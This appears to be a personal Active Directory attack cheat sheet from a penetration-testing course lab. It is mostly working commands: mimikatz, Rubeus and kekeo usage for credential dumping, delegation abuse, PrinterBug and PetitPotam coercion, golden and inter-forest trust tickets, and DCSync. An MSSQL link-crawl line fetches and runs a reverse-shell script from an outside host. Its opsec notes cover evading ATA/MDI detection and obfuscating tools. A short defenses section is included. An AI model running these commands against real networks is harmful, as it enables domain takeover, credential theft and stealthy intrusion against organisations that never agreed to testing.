`Import-Module C:\Tools\PowerView.ps1`
`Get-NetUser -TrustedToAuth` *full enumeration! userprincipalname: (the service), msds-allowedtodelegateto: (the services it can delegate)*

- **Check for if potential service exists so we can dump cred later on**
`Get-CimInstance -ClassName Win32_Service | Where-Object {$_.StartName -like 'svcIIS*'} | Select-Object *`
- **MIMIKATZ: Dump clear text credentials (for services) from registry**
`mimikatz # token::elevate` *Elevate System privs*
`mimikatz # lsadump::secrets` *Dump clear text cred from registry for features such as Windows services*
`mimikatz # token::revert` *revert the priv*

- **kekeo: Generate TGT for services**
`tgt::ask /user:svcIIS /domain:za.NAI.loc /password:redacted`
*user - The user who has the constrained delegation permissions.
domain - The domain that we are attacking since Kekeo can be used to forge tickets to abuse cross-forest trust.
password - The password associated with the svcIIS account.*

- **kekeo: Generate TGS (for both services)**
`tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.NAI.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:http`
`tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.NAI.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:wsman/THMSERVER1.za.NAI.loc`

- **mimikatz import the two TGS**
`mimikatz # privilege::debug`
`kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.NAI.loc@ZA.TRYHACKME.LOC.kirbi`
`kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.NAI.loc@ZA.TRYHACKME.LOC.kirbi`

- **Check if the PSsession exists**
`New-PSSession -ComputerName OXIserver1.za.NAI.loc`

- **Get RCE on the server**
`Enter-PSSession -ComputerName OXIserver1.za.NAI.loc`

- **The idea is to Discover domain computers which have unconstrained delegation enabled using PowerView:**
`Get-DomainComputer -UnConstrained`
- **Using ActiveDirectory module:**
`Get-ADComputer -Filter {TrustedForDelegation -eq $True}`
`Get-ADUser -Filter {TrustedForDelegation -eq $True}`

- **Compromise the server(s) where Unconstrained delegation is enabled and get admin privs. We must trick or wait for a domain admin to connect a service on appsrv. Now, if the command is run again:**
`Invoke-Mimikatz–Command '"sekurlsa::tickets /export"'`
- **The DA token could be reused:**
`Invoke-Mimikatz -Command '"kerberos::ptt C:\Users\appadmin\Documents\user1\[0;2ceb8b3]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi"'`

- **PRINTER-BUG A feature of MS-RPRN which allows any domain user (Authenticated User) can force any machine (running the Spooler service) to connect to a second machine of the domain user's choice.**

- **We can capture the TGT of dcorp-dc$ by using Rubeus (https://github.com/GhostPack/Rubeus) on dcorp-appsrv:**
`Rubeus.exe monitor /interval:5 /nowrap`
- **And after that run MS-RPRN.exe (https://github.com/leechristensen/SpoolSample) on the student VM:**
`MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local\\dcorp-appsrv.dollarcorp.moneycorp.local`

- **We can also use PetitPotam.exe (https://github.com/topotam/PetitPotam) on dcorp-appsrv, PetitPotam uses EfsRpcOpenFileRaw function of MS-EFSRPC (Encrypting File System Remote Protocol) protocol and doesn't need credentials when used against a DC(so that can be done through a non-domain machine and the function runs even if the service is not enabled:**
`PetitPotam.exe dcorp-appsrv dcorp-dc`
- **On dcorp-appsrv:**
`Rubeus.exe monitor /interval:5`
- **Copy the base64 encoded TGT, remove extra spaces (if any) and use it on the student VM:**
`Rubeus.exe ptt /ticket:`
- **Once the ticket is injected, run DCSync:**
`Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'`


give me the output in one output text ( the black one you usuall use, becuase it's easy for copy and paste). This is how i want you to do it :   
- **Setup NTLM relay:**
  `python3.9 /opt/impacket/examples/ntlmrelayx.py -smb2support -t smb://"OXISERVER1 IP" -debug`


## CONSTRAINED DELEGATION 
Constrained Delegation with Protocol Transition means The web service requests a ticket from the Key Distribution Center (KDC) for someones's account without supplying a password, as the websvc account. The KDC checks the websvc userAccountControl value for the TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION attribute, and that someones's account is not blocked for delegation. To abuse constrained delegation in above scenario, we need to have access to the websvc account. If we have access to that account, it is possible to access the services listed in msDS-AllowedToDelegateTo of the websvc account as ANY user.

- **Enumerate users and computers with constrained delegation enabled ,Using PowerView (dev)**
`Get-DomainUser–TrustedToAuth`
`Get-DomainComputer–TrustedToAuth`
- **Using ActiveDirectory module:**
`Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo`

- **Either plaintext password or NTLM hash/AES keys is required. We already have access to websvc's hash from dcorp-adminsrv,Using asktgt from Kekeo, we request a TGT (steps 2 & 3 in the diagram):**
`kekeo# tgt::ask /user:websvc /domain:dollarcorp.moneycorp.local /rc4:cc098f204c5887eaa8253e7c2749156f`
- **Using s4u from Kekeo, we request a TGS**  
`tgs::s4u /tgt:TGT_websvc@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneyco rp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:cifs/dcorp-mssql.dollarcorp.moneycorp.LOCAL`
- **Using mimikatz, inject the ticket:**
`Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_cifs~dcorp-mssql.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LO
CAL.kirbi"'`
`ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$`

- **To abuse Constrained delegation using Rubeus, we can use the following command (We are requesting a TGT and TGS in a single command):**
`Rubeus.exe s4u /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:Administrator /msdsspn:CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL /ptt`
`ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$`

- **(SUPER IMPORTANT !!) In Kerberos is that the delegation occurs not only for the specified service but for any service running under the same account. There is no validation for the SPN specified. For example this account samaccountname: (DCORP-ADMINSRV$) can acces this service msds-allowedtodelegateto : (TIME/dcorp-cd.etc) as any user and it can also access all the services that run with the same service account as the TIME service. So all interesting services uses the machine account as the service account (for example TIME SERVICE,winrm, http,rpcss and etc). So that means what we cannot only access the TIME service on the domain controller as an  domain administrator but we can also access the other services.**

- **Either plaintext password or NTLM hash is required. If we have access to dcorp-adminsrv hash  Using asktgt from Kekeo, we request a TGT:**
`tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:1fadb1b13edbc5a61cbdc389e6f34c67`
- **Using s4u from Kekeo_one (no SNAME validation):**
`tgs::s4u /tgt:TGT_dcorp-adminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneyc orp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorp-dc.dollarcorp.moneycorp.LOCAL`

- **Using mimikatz:**
`Invoke-Mimikatz -Command '"kerberos::ptt GS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'`
`Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'`

- **To abuse constrained delegation for dcorp-adminsrv$ using Rubeus, we can use the following command (We are requesting a TGT and TGS in a single command)(We asked LDAP service so as to perform dc-sync later :):**
`Rubeus.exe s4u /user:dcorp-adminsrv$ /aes256:db7bd8e34fada016eb0e292816040a1bf4eeb25cd3843e041d0278d30dc1b445 /impersonateuser:Administrator /msdsspn:time/dcorp-dc.dollarcorp.moneycorp.LOCAL /altservice:ldap /ptt`
- **After injection, we can run DCSync:**
`Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'`


##  Resource-based Constrained Delegation
Moves delegation authority to the resource/service administrator. Instead of SPNs on msDs-AllowedToDelegatTo on the front-end service like web service, access in this case is controlled by security descriptor of msDS-AllowedToActOnBehalfOfOtherIdentity (visible as PrincipalsAllowedToDelegateToAccount) on the resource/service like SQL Server service. That is, the resource/service administrator can configure this delegation whereas for other types, SeEnableDelegation privileges are required which are, by default, available only to Domain Admins. o abuse RBCD in the most effective form, we just need two privileges.
– One, control over an object which has SPN configured (like admin access to a domain joined machine or ability to join a machine to domain - ms-DS-MachineAccountQuota is 10 for all domain users)
– Two, Write permissions over the target service or object to configure msDS-AllowedToActOnBehalfOfOtherIdentity

-**Admin privileges on student VMs that are domain joined machines.Enumeration for the users with Write permissions over the machines that have RCBD!**
https://gist.github.com/FatRodzianko/e4cf3efc68a700dca7cedbfd5c05c99f
- **Enumeration would show that the user 'ciadmin' has Write permissions over the dcorp-mgmt machine!**
`Find-InterestingDomainACL | ?{$_.identityreferencename -match 'ciadmin'}`

- **Check the MachineAccountQuota setting for the domain and create a computer account using PowerMad:**
- **Check MachineAccountQuotaValue**
`Get-ADDomain | Select-Object -ExpandProperty DistinguishedName | Get-ADObject -Properties 'ms-DS-MachineAccountQuota'`
- **Use PowerMad to leverage MachineAccountQuota and make a new machine that we have control over**
`Import-Module C:ToolsPowermad-masterPowermad.ps1`
`$password = ConvertTo-SecureString 'ThisIsAPassword' -AsPlainText -Force`
`New-MachineAccount -machineaccount dcorp-student1 -Password $($password)`


- **Using the ActiveDirectory module, configure RBCD on dcorp-mgmt for student machines :**
`$comps = 'dcorp-student1$','dcorp-student2$'`
`Set-ADComputer -Identity dcorp-mgmt -PrincipalsAllowedToDelegateToAccount $comps`
- **Now, let's get the privileges of dcorp-studentx$ by extracting its AESkeys:**
`Invoke-Mimikatz -Command '"sekurlsa::ekeys"'`
- **Use the AES key of dcorp-studentx$ with Rubeus and access dcorp- mgmt as ANY user we want:**
`Rubeus.exe s4u /user:dcorp-student1$ /aes256:d1027fbaf7faad598aaeff08989387592c0d8e0201ba453d83b9e6b7fc7897c2 /msdsspn:http/dcorp-mgmt /impersonateuser:administrator /ptt`
`winrs -r:dcorp-mgmt cmd.exe`(Because we have a TGS we cannot jump to another machine as a Domain Admin)

## Forest privesc

(Child to Parent)Knock knock whos there? Enterprise admin plz open the gates
- **sIDHistory is a user attribute designed for scenarios where a user is moved from one domain to another. When a user's domain is changed,they get a new SID and the old SID is added to sIDHistory.sIDHistory can be abused in two ways of escalating privileges within a forest:**
– krbtgt hash of the child
– Trust tickets
- **So, what is required to forge trust tickets is, obviously, the trust key. Look for [In] trust key from child to parent.**
`Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc`
- **We can forge and inter-realm TGT:**
`Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:7ef5be456dc8d7450fb8f5f7348746c5 /service:krbtgt /target:moneycorp.local /ticket:C:\AD\Tools\trust_tkt.kirbi"'`

kerberos::golden The mimikatz module
/domain:dollarcorp.moneycorp.local FQDN of the current domain
/sid:S-1-5-21-1874506631-3219952063-538504511 SID of the current domain
/sids:S-1-5-21-280534878-1496970234-700767426-519 SID of the enterprise admins group of the parent domain
/rc4:7ef5be456dc8d7450fb8f5f7348746c5 RC4 of the trust key
/user:Administrator User to impersonate
/service:krbtgt Target service in the parent domain
/target:moneycorp.local FQDN of the parent domain
/ticket:C:\AD\Tools\trust_tkt.kirbi Path where ticket is to be saved

- **Get a TGS for a service (CIFS below) in the target domain by using the forged trust ticket.**
`.\asktgs.exe C:\AD\Tools\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local`
- **Use the TGS to access the targeted service.**
`.\kirbikator.exe lsa .\CIFS.mcorp-dc.moneycorp.local.kirbi`
`ls \\mcorp-dc.moneycorp.local\c$`
- **Tickets for other services (like HOST and RPCSS for WMI, HTTP forPowerShell Remoting and WinRM) can be created as well,We can use Rubeus too for same results! Note that we are still using the TGT forged initially**
`Rubeus.exe asktgs /ticket:C:\AD\Tools\kekeo_old\trust_tkt.kirbi /service:cifs/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt`
`ls \\mcorp-dc.moneycorp.local\c$`

-**Child to Parent using krbtgt hash.We will abuse sIDhistory once again**
`Invoke-Mimikatz -Command '"lsadump::lsa /patch"'`
`Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'`
- **In the command above, the mimkatz option "/sids" is forcefully setting the sIDHistory for the Enterprise Admin group for dollarcorp.moneycorp.local that is the Forest Enterprise Admin Group.**

- **On any machine of the current domain**
`Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi"'`
`ls \\mcorp-dc.moneycorp.local.kirbi\c$`
`gwmi -class win32_operatingsystem -ComputerName mcorp-dc.moneycorp.local`
`C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"`

- **More Forest Privesc**
Child to Parent using krbtgt hash (Reccomended way, really silent and bypasses MDI)Avoid suspicious logs by using Domain Controllers group. • S-1-5-21-2578538781-2508153159-3419410681-516 – Domain Controllers • S-1-5-9 – Enterprise Domain Controllers
`Invoke-Mimikatz -Command '"kerberos::golden /user:dcorp-dc$ /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /groups:516 /sids:S-1-5-21-280534878-1496970234-700767426-516,S-1-5-9 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ptt"'`
`Invoke-Mimikatz -Command '"lsadump::dcsync /user:mcorp\Administrator /domain:moneycorp.local"'`

- **Across forest trusts will not work as the above as there is SID filtering. You can only access resources that are explicitly allowed, between forests and you do it the same way as above. In this case the shares**
Once again, we require the trust key for the inter-forest trust.
`Invoke-Mimikatz -Command '"lsadump::trust /patch"'`
- **An inter-forest TGT can be forged**
`Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /rc4:cd3fb1b0b49c7a56d285ffdbb1304431 /service:krbtgt /target:eurocorp.local /ticket:C:\AD\Tools\kekeo_old\trust_forest_tkt.kirbi"'`
- **Get a TGS for a service (CIFS below) in the target domain by using the forged trust ticket.**
`.\asktgs.exe C:\AD\Tools\kekeo_old\trust_forest_tkt.kirbiCIFS/eurocorp-dc.eurocorp.local`
- **Use the TGS to access the targeted service.**
`.\kirbikator.exe lsa .\CIFS.eurocorp-dc.eurocorp.local.kirbi`
`ls \\eurocorp-dc.eurocorp.local\forestshare\`
- **Using Rubeus (using the same TGT which we forged earlier):**
`Rubeus.exe asktgs /ticket:C:\AD\Tools\kekeo_old\trust_forest_tkt.kirbi/service:cifs/eurocorp-dc.eurocorp.local /dc:eurocorp-dc.eurocorp.local /ptt`
`ls \\eurocorp-dc.eurocorp.local\forestshare\`

## Trust Abuse - MSSQL Servers
 Databases links have no forest boundaries

- **Enumerate SQL Instances in the Domain:**
  `Get-SQLInstanceDomain` (returns all, maybe not active)

- **Test SQL Server Connection:**
  `Get-SQLConnectionTestThreaded`

- **Test SQL Server Connection for Active Instances:**
  `Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose` (returns the active ones)

- **Gather Information for Active SQL Instances:**
  `Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose` (returns the active ones)

-**A database link allows a SQL Server to access external data sources like other SQL Servers and OLE DB data sources. In case of database links between SQL servers, that is, linked SQL servers it is possible to execute stored procedures. Database links work even across forest trusts.**

- **Search for Database Links ( to remote servers) on Instance 'dcorp-mssql':**
  `Get-SQLServerLink -Instance dcorp-mssql -Verbose`
- **Crawl Database Links on Instance 'dcorp-mssql':**
  `Get-SQLServerLinkCrawl -Instance dcorp-mssql -Verbose`

- **Executing Commands on all machines in the chain in order to see if any of them will give us a result back so we will have command execution. When you find one machine, use the -QueryTarget parameter to run a Query on a specific instance. (Keep in mind that if you have admin privileges on a database, you can do several things there, instead of just getting a reverse shell and running 'whoami' to avoid getting caught and find privilege escalation opportunities)**

- **Execute Command on all Linked Machines to Run 'whoami':**
  `Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'whoami'"`
- **Execute Command on a Specific Linked Machine (eu-sql) to Run 'whoami':**
  `Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'whoami'" -QueryTarget eu-sql`
- **Execute Command on a Specific Linked Machine (dcorp-mssql.dollarcorp.moneycorp.local) to Download and Execute PowerShell Script:**
  `Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.X/Invoke-PowerShellTcp.ps1'')"'`


## OPSEC proposals, Notes, DEFENSES, 


## Reduce the number of Domain Admins in your environment.
- **Reduce Domain Admins:** Try to reduce the number of Domain Administrators in your environment.

## Limit login of DAs to Domain Controllers
- **Limit DA Login:** Do not allow or limit Domain Admins to log in to any other machine other than the Domain Controllers. If logins to some servers are necessary, do not allow other administrators to log in to that machine.

## Avoid running services with DAs
- **Avoid Running Services with DAs:** (Try to) Never run a service with a Domain Admin. Keep in mind that credential theft protections (Credential Guard, Protected Users group) do not protect against extracting credentials from the registry, only from lsass. Set "Account is sensitive and cannot be delegated" for DAs.

## Protected Users Group
- **Protected Users Group:** Protected Users is a group introduced in Server 2012 R2 for "better protection against credential theft" by not caching credentials in insecure ways. A user added to this group has following major device protections:
  - Cannot use CredSSP and WDigest - No more cleartext credentials caching.
  - NTLM hash is not cached.
  - Kerberos does not use DES or RC4 keys. No caching of clear text credentials or long-term keys. You can still kerberoast a member of a protected user group because RC4 is controlled by the client when requesting a TGS.
- If the domain functional level is Server 2012 R2, following DC protections are available:
  - No NTLM authentication.
  - No DES or RC4 keys in Kerberos pre-auth.
  - No delegation (constrained or unconstrained)
  - No renewal of TGT beyond initial four-hour lifetime - Hardcoded, unconfigurable "Maximum

## Protected Users Group (Contd.)
- **Maximum Protected Users Group:** Needs all domain controllers to be at least Server 2008 or later (because AES keys).
- Not recommended by Microsoft to add DAs and EAs to this group without testing "the potential impact" of lockout.
- No cached logon i.e. no offline sign-on.
- Having computer and service accounts in this group is useless as their credentials will always be present on the host machine.

## Privileged Administrative Workstations (PAWs)
- **PAWs:** A hardened workstation for performing sensitive tasks like administration of domain controllers, cloud infrastructure, sensitive business functions, etc.
- Can provide protection from phishing attacks, OS vulnerabilities, credential replay attacks.
- Admin Jump servers to be accessed only from a PAW, multiple strategies:
  - Separate privilege and hardware for administrative and normal tasks.
  - Having a VM on a PAW for user tasks.

## LAPS (Local Administrator Password Solution)
- **LAPS:** Centralized storage of passwords in AD with periodic randomizing where read permissions are access controlled.
- Computer objects have two new attributes - ms-mcs-AdmPwd attribute stores the clear-text password and ms-mcs-AdmPwdExpirationTime controls the password change. (Only DAs can read the password from a machine account, even the machine account cannot read(but can write) it, but with careful enumeration, it is possible to retrieve which users can access(read) the clear-text password providing a list of attractive targets!
- Storage in clear text, transmission is encrypted.

## Just In Time (JIT) administration
- **JIT Administration:** Provides the ability to grant time-bound administrative access on a per-request basis.
- Check out Temporary Group Membership! (Requires Privileged Access Management Feature to be enabled on the forest level which can't be turned off later)
  `Add-ADGroupMember -Identity 'Domain Admins' -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 60)`

## JEA (Just Enough Administration)
- **JEA (Just Enough Administration):** Provides role-based access control for PowerShell-based remote delegated administration.
- With JEA, non-admin users can connect remotely to machines for doing specific administrative tasks.
- For example, we can control the command a user can run and even restrict parameters which can be used.
- JEA endpoints have PowerShell transcription and logging enabled.

## Credential Guard (bypassed by mimikatz)
- **Credential Guard:** "Uses virtualization-based security to isolate secrets so that only privileged system software can access them".
- Effective in stopping Pass-the-Hash (PTH) and Over-PTH attacks by restricting access to NTLM hashes and TGTs. It is not possible to write Kerberos tickets to memory even if we have credentials. But, [Credential Guard Documentation](https://docs.microsoft.com/en-us/windows/access-protection/credential-guard/credential-guard)

## Device Guard (WDAC)
- **Device Guard (WDAC):** UMCI is something which interferes with most of the lateral movement attacks we have seen.
- While it depends on the deployment (discussing which will be too lengthy), many well-known application whitelisting bypasses - signed binaries like csc.exe, MSBuild.exe, etc. - are useful for bypassing UMCI as well.
- Check out the LOLBAS project ([LOLBAS](lolbas-project.github.io/)).

# Bypassing ATA (Don't downgrade, use AES, comply with time policies, don't create tickets with 9999 time)
- **Bypassing ATA:** ATA, for all its goodness, can be bypassed and avoided.
- The key is to avoid talking to the DC as long as possible and make the traffic we generate appear as attacker normal.
- To bypass DCSync detection, go for users who are whitelisted. Usually, accounts like Sharepoint Administrators and Azure AD Connect PHS account may be whitelisted.
- Also, if we have NTLM hash of a DC, we can extract NTLM hashes of any machine account using netsync.
- If we forge a Golden Ticket with SID History of the Domain Controllers group and Enterprise Domain Controllers Group, there are fewer chances of detection by ATA:
  `Invoke-Mimikatz -Command '"kerberos::golden /user:dcorp-dc$ /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /groups:516 /sids:S-1-5-21-280534878-1496970234-700767426-516,S-1-5-9 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ptt"'`

## Obfuscation
- **Obfuscation:** For Rubeus.exe, use ConfuserEx ([ConfuserEx](https://github.com/mkaring/ConfuserEx)) to obfuscate the binary.

## Notes
### General way 2: of opsec.
- **Opsec General Way 2:** When an admin is running as a service on a machine, we can extract the clear text pass with sekurlsa::ekeyes.

### Things to remember 3: opsec
- **Opsec Things to Remember 3:** If our target is 2016 and before then after using a golden ticket or a silver ticket, we can't use winrs or powershell remoting. However, you can still run commands using WMI (`gwmi -C win32_computersystem -ComputerName dcorp-dc`). If it's 2019 ++ you have no problem.

### Things to remember 4: opsec
- **Opsec Things to Remember 4:** Using a silver ticket might be fancy because Microsoft MDI doesn't care about silver tickets and in some cases, we don't touch the DC but our persistence period by default is 30 days for computer accounts. Also, keep in mind that if we want to do multiple things even when targeting a DC (not recommended), we have to create different tickets for different purposes (ex: HOST to create a schtask).

### Things to remember 5: opsec
- **Opsec Things to Remember 5:** If you try to create a silver ticket and use /service:HTTP in order to use winrm it won't work if it's 2016.

### Things to remember 6: opsec
- **Opsec Things to Remember 6:** When you get access to a new user, it is worth checking if he/she has local admin access to any other machine.

### Things to remember 7: opsec
- **Opsec Things to Remember 7:** In cases you run sekurlsa::ekeys and if you find many AES keys for the same user, check the SID always, and for example, in the case of a resource-based constrained delegated scenario, would pick S-1-5-18 which is the admin one!

### Things to remember 8: opsec
- **Opsec Things to Remember 8:** Use silver tickets for staying under the radar. Don't do stupid things like adding your account to the domain admin group with that, be smart.

### Things to remember 9: opsec
- **Opsec Things to Remember 9:** Kerberoasting is one of the best attacks for staying under the radar, if you manage to guess the pass (I mean it's RC4 ... hope you do it!)

### Things to remember 10: opsec
- **Opsec Things to Remember 10:** ACL attacks are interesting and very profitable, some are stealthier than others.

## Things to remember 11: opsec
- **Opsec Things to Remember 11:** Credential theft protections (Credential Guard, Protected users group) are not protecting against extracting credentials from the registry, only from lsass. Credentials for local accounts in SAM and Service account credentials from LSA Secrets are NOT protected.

## Things to remember 12: When looking for domain admins
- **Opsec Things to Remember 12:** When looking for domain admins, you should always check the SID. If the last three digits are 500, someone might have renamed them. On the other hand, on a non-domain machine when you are not a local admin, you can't find that if they are renamed.

### Behavioural bypassing
## Scenario 1: Download and execute in memory
- **Behavioural Bypassing Scenario 1:** When an admin is running as a service on a machine we can extract the clear text pass with sekurlsa::ekeyes.
- Example:
  - `winrs -r;dcorp-mgmt hostname:whoami` -> "From our machine exec on the other machine"
  - `iwr http://172.16.100.1/Loader.exe -OutFile C:\Users\Public\Loader.exe` "Download on our machine"
  - `echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe` "Copy on the rmt machine"
  - `winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://172.16.100.1/Loader.exe sekurlsa::ekeys exit` "Wrong way as executable tries to download another executable and run it from 'remote server'"
  - `winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=127.16.100.1`"Correct way as we forward our port as the remote machine localhost port access, so it seems that the remote machine is downloading from itself and not from a remote server"

## Scenario 2: Avoid spamming all machines
- **Noisy Commands to Avoid Scenario 2:** In general, the idea is when you ask something from the DC and you spam all the machines in the network you will leave logs on all the machines and you will cause a network spike and not only that.

